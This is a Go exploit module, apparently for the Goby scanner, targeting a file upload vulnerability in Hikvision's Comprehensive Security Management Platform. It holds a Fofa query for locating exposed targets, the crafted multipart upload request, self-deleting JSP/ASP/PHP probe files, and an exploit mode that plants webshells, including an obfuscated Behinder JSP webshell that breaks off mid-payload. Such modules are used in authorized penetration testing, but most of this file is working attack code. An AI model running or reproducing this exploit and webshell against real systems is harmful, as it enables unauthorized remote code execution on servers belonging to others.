package exploits

import (
	"encoding/base64"
	"net/url"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "HIKVISION - Comprehensive Security Management Platform /clusters Interface File Upload Vulnerability",
    "Description": "<p>HIKVISION - Comprehensive Security Management Platform leverages video intelligence to provide applications such as video capture, integrated safety and security, dormitory management attendance, AR-based situational awareness, data dashboard, case incident library, and smart door locks through multidimensional analysis of IoT data. It integrates alerting, querying, positioning, management, and analysis to empower administrators in managing campus operations across multiple business dimensions, enhancing comprehensive campus management capabilities.</p>",
    "Product": "HIKVISION-General-SMP",
    "Homepage": "https://www.hikvision.com/",
    "DisclosureDate": "2024-08-05",
    "PostTime": "2024-08-05",
    "Author": "1538279017@qq.com",
    "FofaQuery": "body=\"download/InstallRootCert.exe\" && body=\"综合安防管理平台\"",
    "GobyQuery": "body=\"download/InstallRootCert.exe\" && body=\"综合安防管理平台\"",
    "Level": "3",
    "Impact": "<p> File upload vulnerabilities enable attackers to upload files containing malicious code to servers, potentially executing remote code, stealing user data, or performing unauthorized operations on the server. This poses a significant threat to the security and stability of systems.</p>",
    "Recommendation": "<p>restrict file types and sizes, enforce strict file upload validation, employ secure file naming strategies, and perform thorough scanning and detection of uploaded files on the server side to ensure their security and legitimacy.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Behinder,Godzilla,Command,Customize"
        },
        {
            "name": "Command",
            "type": "input",
            "value": "dir",
            "show": "mode=Command"
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "test",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload",
        "HW-2024"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "海康威视综合安防管理平台/clusters 接口文件上传漏洞",
            "Product": "HIKVISION-综合安防管理平台",
            "Description": "<p>海康威视综合安防管理平台依托视频智能，通过对物联数据的多维度分析处理，提供视频采集、安消一体、宿管考勤、AR实景一张图、数据驾驶舱、案事件库、智能门锁等应用，集预警、查询、定位、管理、分析为一体，助力管理者从多个业务维度对校园工作进行管理，提升校园综合管理能力<br></p>",
            "Recommendation": "<p>限制上传文件类型和大小，实施严格的文件上传验证，使用安全的文件命名策略，以及在服务器端对上传的文件进行深度扫描和检测，确保上传文件的安全性和合法性。<br></p>",
            "Impact": "<p>文件上传漏洞可以让攻击者上传包含恶意代码的文件到服务器，从而执行远程代码，窃取用户数据，或者在服务器上执行非授权操作，严重威胁到系统的安全性和稳定性。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "HIKVISION - Comprehensive Security Management Platform /clusters Interface File Upload Vulnerability",
            "Product": "HIKVISION-General-SMP",
            "Description": "<p>HIKVISION - Comprehensive Security Management Platform&nbsp;leverages video intelligence to provide applications such as video capture, integrated safety and security, dormitory management attendance, AR-based situational awareness, data dashboard, case incident library, and smart door locks through multidimensional analysis of IoT data. It integrates alerting, querying, positioning, management, and analysis to empower administrators in managing campus operations across multiple business dimensions, enhancing comprehensive campus management capabilities.<br></p>",
            "Recommendation": "<p>restrict file types and sizes, enforce strict file upload validation, employ secure file naming strategies, and perform thorough scanning and detection of uploaded files on the server side to ensure their security and legitimacy.<br></p>",
            "Impact": "<p>&nbsp;File upload vulnerabilities enable attackers to upload files containing malicious code to servers, potentially executing remote code, stealing user data, or performing unauthorized operations on the server. This poses a significant threat to the security and stability of systems.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10985"
}`

	postOrGet_FKEJKL := func(hostInfo *httpclient.FixUrl, filename string, pocContent string) (filePath string, headerMap map[string]string, err error) {
		//请注意：pocContent字段是原始的shell内容，如果漏洞利用需要对内容进行加密，组装，修改，则需在此处编码
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlPost string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlPost)
			PostRequest.Timeout = 12
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			PostRequest.Data = data
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}
		path := "/clusterMgr/clusters/ssl/file;.js"
		headerMap = map[string]string{
			"Host":         hostInfo.IP,
			"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
			"Connection":   "close",
			"Content-Type": "multipart/form-data; boundary=--------------------------984514492333278399715408",
		}
		//指定发包内容
		body := "----------------------------984514492333278399715408\r\nContent-Disposition: form-data; name=\"file\";filename=\"languages/" + filename + "\"\r\nContent-Type: image/png\r\n\r\n" + pocContent + "\r\n----------------------------984514492333278399715408\r\nContent-Disposition: form-data; name=\"proxyAddress\"\r\n\r\n0.0.0.0\r\n----------------------------984514492333278399715408--\r\n"
		// body += "\n\n" + pocContent + "\n"

		// body += "------WebKitFormBoundaryB9S6D2q4J3f7Y1Z5\n" + "Content-Disposition: form-data; name=\"combo\n\"" + "test.php\n" + "------WebKitFormBoundaryB9S6D2q4J3f7Y1Z5--"

		//发POST请求
		resp, err := setPostRequest(hostInfo, path, body, headerMap)
		if err != nil || resp.StatusCode != 200 {
			return "", nil, err
		}
		filePath = "/clusterMgr/languages/" + filename + ";.js"
		// 注意：返回值为（最终文件访问路径，访问上传文件的请求头，错误）
		return filePath, headerMap, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：上传的文件类型
			fileType := `jsp`
			// 此处需要修改：如果漏洞存在则设置的VulURL路径
			vulURL := "/clusterMgr/clusters/ssl/file;.js"

			// 函数继承
			uploadFileFunc := postOrGet_FKEJKL

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			// 自删马模板
			generatePOCContent := func(fileType string) (string, string) {
				makeRandom := goutils.RandomHexString(8)
				switch fileType {
				case "jsp":
					return makeRandom, `<% out.println("` + makeRandom + `"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>`
				case "jspx":
					return makeRandom, ``
				case "asp":
					return makeRandom, `<%Response.Write("` + makeRandom + `"):Set fso=CreateObject("Scripting.FileSystemObject"):fso.DeleteFile(Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))) %>`
				case "aspx":
					return makeRandom, `<%@ Page Language="C#"%><%@ Import Namespace="System.IO"%><% Response.Write("` + makeRandom + `");File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>`
				case "php":
					return makeRandom, `<?php echo "` + makeRandom + `";unlink(__FILE__);?>`
				case "ashx":
					return makeRandom, "<% @ webhandler language=\"C#\" class=\"AverageHandler\" %>\nusing System;\nusing System.Web;\nusing System.IO;\nusing System.Threading.Tasks;\n\npublic class AverageHandler : IHttpHandler\n{\n    public bool IsReusable\n    { get { return false; } }\n    public void ProcessRequest(HttpContext ctx)\n    {\n        ctx.Response.Write(\"" + makeRandom + "\");\n        Task.Run(async () =>\n        {\n            File.Delete(ctx.Server.MapPath(ctx.Request.FilePath));\n        });\n        ctx.Response.Flush();\n        ctx.Response.End();\n    }\n}"
				}
				return makeRandom, ``
			}

			// 生成指定文件类型自删除马
			makeRandom, pocContent := generatePOCContent(fileType)
			if pocContent == "" {
				return false
			}

			// 组装文件名
			filename := goutils.RandomHexString(8) + "." + fileType
			// fileURL string,headerMap map[string]string,err error
			// filePath为路径，不是完整的URL地址
			// 文件上传
			filePath, headerMap, err := uploadFileFunc(u, filename, pocContent)
			if err != nil {
				return false
			}

			// 文件请求函数
			getRequest := func(hostInfo *httpclient.FixUrl, url string, requestMap map[string]string) (*httpclient.HttpResponse, error) {
				makeRequest := httpclient.NewGetRequestConfig(url)
				makeRequest.VerifyTls = false
				makeRequest.Timeout = 5
				makeRequest.FollowRedirect = false
				if requestMap != nil {
					for postHeaderKey, postHeaderValue := range requestMap {
						makeRequest.Header.Store(postHeaderKey, postHeaderValue)
					}
				}
				return httpclient.DoHttpRequest(hostInfo, makeRequest)
			}

			// 文件请求
			resp, err := getRequest(u, filePath, headerMap)
			if err != nil {
				return false
			}

			// 判断返回值
			if !strings.Contains(resp.Utf8Html, makeRandom) {
				return false
			}

			// 设置VULURL
			ss.VulURL = u.HostInfo + vulURL
			return true
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var pocContent string
			// 此处需要修改：上传的文件类型
			fileTypeAll := `jsp`

			// 函数继承
			uploadFileFunc := postOrGet_FKEJKL

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			// 木马模板
			generatePOCContent := func(fileName, fileType string) string {
				switch fileName {
				case "Behinder":
					switch fileType {
					case "txt":
						return "Password: rebeyond\nWebShell tool: Behinder v3.0\nWebshell type: " + fileTypeAll
					case "jsp":
						return `<%!//\uuu000a\uuuuuuu0020\uuuuuu0070\uuuuuu0075\uuuuuuu0062\uuuu006c\uuuuuuuu0069\uuuuuuuu0063\uuu0020\u0062\uuuuuu0079\uuu0074\uuuuuu0065\uuuuuu005b\uuuuuuuu005d\uuuu0020\uuuuuuuu0041\uuu0051\uuuuu0036\uu006e\uu0032\uuu0028\u0053\u0074\uuuuuuuu0072\uuuuuuu0069\uuuuuuuuuu006e\uuuu0067\uuuuuuuu0020\uuuuuuuuuu0053\uuuu0074\uuuuuuuu0072\uuuuu0069\uuuu006e\uuuuu0067\u0073\uuuuuu002c\uuuu0053\uuu0074\uuuuuuuuu0072\u0069\uuuuuu006e\uuuuuuu0067\uuuuuuuuuu0020\uuuuuuuuuu006b\uuuuuuu0029\uuuuuu0020\uuuuuuuuuu0074\uuuuuuuu0068\uuuu0072\uuuuuuuuu006f\uuuuuuuuuu0077\uuuuuuuu0073\u0020\uuu0045\uuu0078\uuu0063\uuuuuuu0065\uuuuu0070\uuuuuuuuuu0074\uuuuuuuuu0069\uuuuuuuuu006f\uuuuuuuu006e\uuuuuuuu0020\uuuuuuuu007b\uuuuuuuuuu0020\uuuuuuu006a\uuuuuu0061\uuuuuuu0076\uu0061\uuuuu0078\uuuuuuuuuu002e\uuu0063\uuuuu0072\uuuu0079\uuuuuuuuuu0070\uuu0074\uuuuuuuuu006f\u002e\uu0043\uuuu0069\u0070\uuuuuu0068\uu0065\uuuuuuuu0072\uuuuuuu0020\uuuu0042\uuuuu0039\uuuu0072\uuuuuuuu007a\uuuuu0030\uuuuuuu0031\uuuuu0020\uuuuuuuuuu003d\uuuuuuuu0020\uuu006a\u0061\uu0076\uu0061\uuuuuuuu0078\uuu002e\uuuuu0063\uuuu0072\uuuuuuuuu0079\u0070\uu0074\uuuuuuu006f\uu002e\uuuuuu0043\uuu0069\uuuuuu0070\uu0068\uuuu0065\uuuuu0072\uuu002e\uuuuuu0067\uuu0065\uuuuuu0074\u0049\uu006e\uuuuuuuuuu0073\uuuuuu0074\uuuuuuuuuu0061\uuuuuuuuu006e\uuu0063\uuuuuuuuu0065\uuuuu0028\uuuuuuuuu0022\uuuuu0041\uu0045\uu0053\uuuuuu002f\uuuuuuuuuu0045\uuu0043\uuuuuuuuuu0042\uuuuuuuuu002f\uuuuuuuuuu0050\uuu004b\uuuuuuuu0043\uuuuu0053\uuu0035\uuuuu0050\uuuuuuuuu0061\uu0064\uuuu0064\uu0069\u006e\uuuuuuuuu0067\uuuuuuu0022\uu0029\uuuuuu003b\uuuuuu0042\uu0039\uuuuuuu0072\uuu007a\u0030\uuuuuuuuuu0031\uu002e\uuu0069\uuuu006e\uuuuuuuu0069\uuuu0074\u0028\uuu006a\uuu0061\u0076\uuuuuuuu0061\uuuuu0078\uuuuuuuuu002e\uuuuu0063\uuuuuuuuuu0072\u0079\uuuuuuuuuu0070\uuuuuuu0074\uuuuu006f\uuu002e\uuuuuu0043\u0069\uuuuuuu0070\uuuu0068\uu0065\uuu0072\uuuuuuuuuu002e\uuuuuuuuuu0044\uuuuuu0045\uuuuuu0043\uuu0052\uu0059\uuuuuuuuu0050\uuu0054\uuuuuuuu005f\uuuuuuuuu004d\uuuuuu004f\uuuu0044\uuuu0045\uu002c\u0020\uuu0028\uuuuuuu006a\uuuu0061\uu0076\uuuuuuuuuu0061\uuu0078\uuuuuuuuuu002e\u0063\uuuuuuuu0072\uuuuuu0079\uuuuuuuu0070\uu0074\uuuuuuuuuu006f\uuuuuuuuu002e\uuuuuu0073\uuuuuuu0070\uuuuuuuu0065\uuuu0063\uuu002e\u0053\uu0065\uu0063\uuuuu0072\uuuu0065\uu0074\uuuuuuu004b\uuuu0065\u0079\uuuuuuu0053\uuuuuuuu0070\uuuuuu0065\uuuuuu0063\u0029\uuuuuuuuuu0020\uuuuu0043\uuuuuuuu006c\uuuuuuu0061\u0073\u0073\uuuuuuuu002e\uuuu0066\uuuu006f\uuuuuuuuuu0072\uuuu004e\uuuuu0061\uuuuuuuuuu006d\uuuuuuuuu0065\uuuuuuuu0028\uuuuuuuu0022\uuuuuu006a\uuu0061\uuuuuuu0076\uuuuuuuuuu0061\uuuuuuuu0078\uuuuuuu002e\uuuuuu0063\uuuuuuuuu0072\uuuu0079\uu0070\uuuuuu0074\uuuuuuu006f\uuu002e\uu0073\uuuuuuuu0070\uuuu0065\uuuuuuuu0063\uuuuuuuuuu002e\uuuuuuuuu0053\uuuu0065\uuuuuuuuuu0063\uuuuuuuu0072\uuuu0065\uuuuuuuuuu0074\uuuuuuu004b\uuuuuuuuuu0065\uuu0079\u0053\uuuuuuuuu0070\uuuuuuuuu0065\uuuuuuuuu0063\uuuuuu0022\uuuuuuuuu0029\uuuuuuu002e\u0067\uu0065\uuuuu0074\uuu0043\uuuuuuu006f\uuuuuu006e\uuuu0073\uuu0074\uuuu0072\uuuuuuuu0075\uuuuuuuu0063\uu0074\uuuuuuuuu006f\uuuuu0072\uu0028\uuuuuuuuu0062\uuuuuuu0079\uuuuuuuu0074\uuuuuuuuuu0065\uuuuuuu005b\uuu005d\uuu002e\uuuuuuuuu0063\uuu006c\uuuuu0061\uuuuuuu0073\uuuuuuu0073\uu002c\u0020\uuuuuuuu0053\uuuuuuuuuu0074\u0072\uuuuuu0069\u006e\uuuuuuuuuu0067\uuuuuuu002e\u0063\uuuuuuuu006c\uu0061\uuuuuu0073\uuuuuu0073\uuuu0029\uuuuu002e\uuuuuuuuuu006e\uuu0065\uuuuuuuuuu0077\uuuuuuuuu0049\uuu006e\uu0073\uuuuuuuuuu0074\uuuu0061\uu006e\uuuu0063\uuuuuu0065\uuuuuuu0028\uuuuuuuuuu006b\uuuuuuuuuu002e\uuuuu0067\uuu0065\uuuuuuuuu0074\uu0042\uu0079\uuuuuuuuuu0074\uuuu0065\u0073\uuuuuuuu0028\uuuuuuuuuu0029\uuuuuuuu002c\uuuuu0020\uuuuuuu0022\uuuu0041\uuuuu0045\uuuuuuuuu0053\uuuuuuuu0022\uuu0029\uuuuuuu0029\uuuuuuu003b\uu0062\uuuuu0079\uuu0074\uuuuuu0065\uuuuuuuuu005b\uuuuuuuuuu005d\uuu0020\uuuuuuuuu0062\uuuuuuuuuu0079\uuuuuuuuuu0074\uuuuuu0065\uuuuuu0073\uuuuuuuuu003b\u0074\uuuu0072\uuuuuuu0079\uuuu007b\uuuuuuuuuu0069\uuuuuuuuu006e\uuuuuuu0074\uuuuuuu005b\uuuuuuuuuu005d\u0020\uuuuuuuuuu0061\uuuuuuuuu0061\uuuuuuuuuu0020\uu003d\uu0020\uuuuu006e\uuuuuuuu0065\uuuuuuuu0077\uuu0020\uuuuuuuu0069\uuuuuuuuuu006e\uuuuuuuu0074\uuuu005b\uuuuuuuuuu005d\uu007b\uuuuuuuuu0031\uuuuuuuuu0032\uuuu0032\uuu002c\uuuuuuuuuu0020\uuuuuuuuu0031\uuuuuuu0031\uuuuu0033\u002c\uuuuuuuuu0020\uuuuuuuuu0031\uuuuuuuu0030\uuuuuuu0032\uuuu002c\uuuuuu0020\uuuuuuuu0031\uuuuuuuuu0031\uuuuuuuuu0033\u002c\u0020\uuuuu0036\uuu0032\uuuuuuuu002c\uuu0020\uuu0031\uuuuu0030\uuuuuu0031\u002c\uu0020\uu0031\uuuuuuuu0030\uuuuuuuuu0030\uuuu002c\uuuuuuuuu0020\uuuuuuuu0031\uuu0032\uuuuuuuu0031\uuuuuu002c\uuuuu0020\uu0031\uuuuuuuuu0032\uuuuuuuuuu0034\uuuuuuuu002c\u0020\uuuuuuu0036\uuuuuuuuuu0032\uuu002c\uuu0020\uuuuu0038\uuuuu0032\uuuuu002c\uuuuuu0020\u0031\uu0031\uuuuuuuuu0033\u002c\uu0020\uuuuuuuuuu0039\uuuu0039\uu002c\uuuuuuuuuu0020\uuuuuuuuu0031\uuuuuuu0031\uuuuuuuuu0037\uuuu002c\uuuuuuuuu0020\uu0033\uuuuu0038\uuuuuuu002c\uuuuuuuuu0020\uuuuuuu0033\uuuuuuuuuu0036\uuuuuuu007d\uuuuuu003b\uuuuu0053\uuuuuuuuuu0074\u0072\uuuuuuu0069\uu006e\uuuuuuuu0067\uuu0020\uuuuuuuuu0063\uuuuuuu0063\uuuuuu0073\uuuu0074\uuuuuuuu0072\uuuuuuuuu0020\u003d\uuuuu0020\uuuuuu0022\uuuuuuuuu0022\uuuuuuuu003b\uuuuuuuuuu0066\uu006f\uuuuuuuuuu0072\uuuuuuuu0020\uuuuu0028\uuuuuuu0069\uuu006e\u0074\uuuuuuu0020\uuuuuuuu0069\uuu0020\uuuuuuuuuu003d\uuuuu0020\uuu0030\uuuuuuu003b\uuuu0020\uuuu0069\uuuuuuuu0020\uuuu003c\uuuuu0020\uuuuuuuuu0061\uuuuuu0061\uuuu002e\uuuu006c\uuuu0065\uuuuuu006e\uuuuu0067\uuuuuuuuu0074\uuuuu0068\uuuuuuuuu003b\uuu0020\uuu0069\uuuuuuuu002b\uuuuuuuuu002b\uuuuuuuuu0029\uu0020\uu007b\u0020\uuuuuu0061\uuuu0061\uuuuuuu005b\uuuuu0069\uuuuuu005d\uuuuu0020\uuu003d\uuuu0020\u0061\uuuuu0061\uuuuuuuuu005b\uuuu0069\uuuuu005d\uuuuuuuuuu0020\uuuuuu005e\uuuuuuuu0020\uu0030\uuuuuuuuu0078\uuuuuuuuu0030\u0031\uuuuuuuu0030\u003b\uuuuuuuuuu0063\uuuuuuuu0063\u0073\uu0074\uuu0072\uuuu0020\uuu003d\uu0020\u0063\uuuuuuu0063\uuuuuuu0073\uu0074\uuuu0072\uuuuuu0020\uuuu002b\uuuuuuu0020\uuuuu0028\uuuuuuuuu0063\u0068\uuuuuu0061\uuuuuuu0072\uuuuuuuuu0029\uuuuuu0020\uuuuuu0061\uuuuuu0061\uuuuuuuu005b\uuuuuu0069\uuuuuu005d\uuu003b\uuu007d\uuuuuuuuuu0043\uuuuuuuuu006c\uuuuuuuu0061\uu0073\uuuuuuuu0073\uu0020\uuuuuuu0063\uuuuuuuuu006c\uuuuuuuuu0061\uuuuu007a\uuuuuuuu007a\uu0020\uuuuuuuuu003d\uuuu0020\uuuuuuuu0043\uu006c\uuu0061\uuuu0073\uuuuuuuuu0073\uuuuuuuu002e\uuuuu0066\uu006f\uuuuuuuuuu0072\uuuuuuuuu004e\uuuuu0061\uu006d\uuuuuu0065\u0028\uu0063\uuuuuuuuuu0063\uuuuuu0073\uuuuuuuuuu0074\uuuuuu0072\uuuuuuu0029\uu003b\uuuuuu0020\uuuuu004f\uuuuuu0062\uuuuu006a\uuu0065\uuuuuu0063\uuuuuuuuu0074\uu0020\uuuuuuuu0064\uuuuu0065\uuuuuuuuuu0063\uuuuuuu006f\uuuuuuuu0064\uuu0065\uuuuuuu0072\uuuuuu0020\uuu003d\uuuuuuu0020\u0063\uuuu006c\uuuuuuuu0061\uuuuuuuuuu007a\uu007a\uuuu002e\uuuuuuuuu0067\uuuuuuu0065\uuuuu0074\uuuuuuuuu004d\u0065\u0074\uuuuu0068\uuuuuuuu006f\uuuuuuu0064\uuuuu0028\uuu0022\uuuuuuuuuu0067\uuuuuuuuuu0065\uuuuuu0074\uuuuuuuuuu0044\uuuu0065\uu0063\u006f\uuuuuuu0064\uuuuuuuuuu0065\uuuu0072\uuuuuuuuuu0022\uuuuuuuuuu0029\uuuuuuu002e\uuuuuu0069\uuu006e\uuuuuuuuuu0076\uu006f\uuuu006b\uuuuuuuu0065\uuuuuu0028\uuuuuuuuu006e\uuuuu0075\uuuuu006c\uuuuuu006c\uu0029\uuuuuuu003b\uuuu0062\u0079\uuuuuuuuuu0074\uuuuuu0065\uuuu0073\uuu0020\uuuu003d\uu0020\uuuu0020\uuuuuuuuuu0028\uuuuuuuuuu0062\uuuuuu0079\uuuuu0074\uu0065\uuuuuuuuuu005b\uuuuuuu005d\uu0029\uuuuuu0020\uuu0064\uuu0065\uuu0063\uuuuuuuuuu006f\u0064\uuuu0065\uuuuu0072\uuuuu002e\uu0067\uuuu0065\uuuu0074\uu0043\uuuuuu006c\uuuuuuuuuu0061\u0073\uuuuuuuuuu0073\uuuuuuuu0028\uuu0029\u002e\uu0067\uuuuuuu0065\uuuuu0074\u004d\uuuuuuuu0065\uuuuuuuuu0074\uuuuuu0068\uuuu006f\uuuuuu0064\uuuuuuuuuu0028\uu0022\uu0064\uuuuuuuuu0065\uu0063\uuuuuuu006f\uuu0064\uuu0065\uuuuu0022\uuuuu002c\uuu0020\uuuuu0053\uuuuuu0074\uuu0072\uuuuu0069\uuuuuuuuuu006e\uuuuuuuuuu0067\uuuuu002e\uuuuuuu0063\uuuuuuuu006c\uu0061\uuu0073\uu0073\uuuuuuuuu0029\uuuuuuuu002e\u0069\uuuu006e\u0076\uuuuuuuu006f\uuuuuuuu006b\uuu0065\uuuuu0028\u0064\uu0065\uuuu0063\uuuuuuuuuu006f\uuuuuuu0064\uuuuuuuuuu0065\uu0072\uuuuuuuuuu002c\uuuuuuuu0020\uuuuuuuuuu0053\uuuuu0074\uu0072\uuuuuuuuuu0069\uuuuuuuuuu006e\uuu0067\uuuuuu0073\uuuuu0029\uuuu003b\uuuu007d\uuuu0063\uuuuuuuu0061\uuu0074\uuuuu0063\uuuuuuu0068\uu0020\u0028\uuuuuu0054\uuuuu0068\uuuu0072\uuuuuuuu006f\uuuuuuuu0077\uuuuuuuuu0061\uuuuuuu0062\uuu006c\uuuuu0065\uuuuu0020\uuuuuuuuu0065\uuuuu0029\uuu007b\uuuu0069\uuuuuu006e\uuu0074\uuuuuuu005b\uu005d\uuuuuuu0020\uuuuuu0061\uuuuuuu0061\uuuuuuu0020\uuuuuuuu003d\u0020\uuuuuuuuu006e\uuu0065\uuuuuuuuu0077\uuuuuu0020\uuuuuuuuu0069\uuuuuuu006e\uuuu0074\uuuu005b\uuuu005d\u007b\uuuuuuuu0039\u0039\uuuuu002c\uuuu0020\uuuu0031\uuuuuuuuuu0030\u0031\u002c\u0020\uu0031\uuuu0032\uuuuuuuu0036\uuuuuuuuuu002c\uu0020\uuuuuuu0036\uuuu0032\uuuuuuu002c\uuuuuuuu0020\uuuuuuuuu0031\u0032\uuuuuuuuuu0035\uuuuuuuuuu002c\uuuuuuuuuu0020\uuuuu0031\uuuuuuuuu0032\uuuuuuuuu0031\uuu002c\uuuuuuuu0020\uuuuuuuu0039\uuu0039\uuu002c\uuuuuu0020\uuuu0031\uuu0031\uuuu0035\uuuuuuu002c\uuuuuuuuuu0020\u0036\uuuuuuuuuu0032\uuuu002c\uu0020\uuuuuuuuuu0038\u0032\uuuu002c\uuu0020\uu0038\uuu0031\uuuuuuuuuu002c\uuuuuuuuuu0020\uuuuuu0036\uuuuuuuuu0037\uuuuuuu002c\uuu0020\u0038\uuuuuu0035\uuuuuuuu002c\uuuuuuuuuu0020\uuuuuuu0033\uuuuuuuuu0038\uuuuuuuu002c\uuuuuu0020\uuuuuuuuu0033\uuuuuuuu0036\uuu002c\uuuuu0020\uuuuuuu0038\uuuuuuuuu0034\uuuuu002c\u0020\uuuuuuuu0031\uuu0031\uuuuuuu0037\uuuuuuuuu002c\uuuuu0020\uuuuuuuuu0031\uuuuuuu0031\uuu0035\uuuuuu002c\uuuuuuuuuu0020\uuuuuu0031\uuuuuuuuuu0032\uuuu0037\uuuuuu002c\u0020\uuuuuuuuu0031\uuuuu0031\uuuuuu0036\u002c\uuuuuuu0020\uuuuuuuuu0031\u0031\uuuu0037\uuuuuuuuuu002c\uuuuuu0020\uuu0039\uuuuuuu0038\uuuu007d\uuuu003b\uuu0053\u0074\uuuuuuu0072\u0069\uu006e\uuu0067\uuuuuuuuu0020\uuuuuuuu0063\uuuuuuuu0063\u0073\uuuuu0074\uuuuuu0072\uuuuuuu0020\uuuu003d\uuuuuuuuu0020\uuuuuuu0022\uuuu0022\uuuuu003b\uuuuuuu0066\uuuuuuuuu006f\uuuuuuuuu0072\uuuuuu0020\uuu0028\uuuuuuuuuu0069\uuuu006e\uuuuu0074\uuuuu0020\u0069\u0020\uuuuuuuuuu003d\uuuuuu0020\uu0030\uuuuuuu003b\uuuu0020\uuuuu0069\uuu0020\uuuu003c\uuuuuuuu0020\uuuuuuu0061\uuuuuuuuuu0061\uuuuuuu002e\uuuuuuu006c\uuu0065\uuuuuuuu006e\uuuuuuu0067\uuuuuu0074\u0068\uuuuuuu003b\uuuuu0020\uuuuuuu0069\uuuuuuuu002b\uuu002b\uuuuuuuuu0029\uuuuuuuuu0020\uuu007b\uuuu0061\uuu0061\uuuuu005b\uuuu0069\uuu005d\uuuuu0020\uuuuuuuuu003d\uu0020\uuuuu0061\u0061\uu005b\uuuuuuu0069\u005d\uuuuuuuu0020\uuu005e\uuuuu0020\uuuuuuuuu0030\uuuuuu0078\uu0030\uuuuuuuuu0031\uuu0030\uuuuuuuuuu003b\uuuuuuu0063\uuuuuu0063\uuuuuuuuuu0073\uuuu0074\uuuuuu0072\uuuuu0020\uuuuuuu003d\uuu0020\uuuuuuuuu0063\uu0063\uuuu0073\uuuu0074\uu0072\uuuu0020\uuuuuuuuuu002b\u0020\uuuuuuu0028\uuuuuu0063\uuuu0068\u0061\uuuuuu0072\uuuu0029\uuuu0020\uuuuuuuu0061\u0061\u005b\uuuuuuuuuu0069\uu005d\uuuuuuuuu003b\uuuuuuuuuu007d\uuuuuuuuu0043\uuuu006c\uuuuuuuuu0061\uuuuuuuuuu0073\uuuu0073\uuuu0020\uuuuuuu0063\uuuuu006c\uu0061\uuuuuuuu007a\uuuu007a\u0020\uuuuuuuuuu003d\uuuuuuu0020\uuu0043\uuuuu006c\uuuuuuuuu0061\uuuuuuuu0073\u0073\uuuuuuu002e\uu0066\uuuuuuuuuu006f\uuuuuuuuu0072\uu004e\uu0061\uuuuuuuu006d\uuuuuuuu0065\uuuu0028\uuuuu0063\uuuuuuuuu0063\uuuuu0073\u0074\uuuuuuu0072\uuuuuuu0029\uuuuuuu003b\uuuuuuuuu0062\uuuuuuuu0079\uu0074\uuuuuuuuu0065\uuuuuuuu0073\uuuuuuuu0020\uuuuu003d\uu0020\uuu0028\uuuuuuuuu0062\uuuuuu0079\uuuu0074\uu0065\u005b\uuu005d\uu0029\uuuuuuuuu0020\uuuuuuuuuu0063\uuuuu006c\uuuuuu0061\uuuuuu007a\uuuuuuuuuu007a\uu002e\uuuuu0067\uuuuu0065\uuuuuu0074\uuuuuuuu004d\uuuuuuuu0065\u0074\uuuuuuuuu0068\uuuuuuu006f\u0064\uuuuu0028\uuuuu0022\uu0064\uuuuuuu0065\uuuu0063\uuuuuuuuuu006f\u0064\u0065\uuuuuu0042\u0075\uuuuuuu0066\uuuuuuu0066\uuu0065\uuuuuuuuu0072\uuu0022\uuuu002c\uuuuu0020\u0053\u0074\u0072\uuu0069\uuuuuuuu006e\uuuu0067\uuuuuuuu002e\uuuuuuuu0063\uuuuuuuu006c\u0061\uuuuuuuuuu0073\uuuuuuu0073\uuuuuuuuuu0029\uuuuuuuuuu002e\uuuuu0069\uu006e\uuuu0076\uuuuuuuuuu006f\uu006b\uuuuuuuuu0065\uuuu0028\uuu